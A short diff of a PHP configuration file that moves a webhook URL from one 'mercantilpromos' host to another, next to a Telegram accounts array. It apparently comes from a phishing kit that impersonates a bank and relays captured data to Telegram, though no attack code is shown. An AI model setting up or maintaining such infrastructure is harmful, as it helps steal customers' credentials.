@@ -25,5 +25,5 @@ $telegram_accounts = [
 
 ];
 
-$webhook_url = 'https://mercantilpromos.prod.page/approve.php';
+$webhook_url = 'https://mercantilpromos.ash-2.instapods.app/approve.php';
 ?>
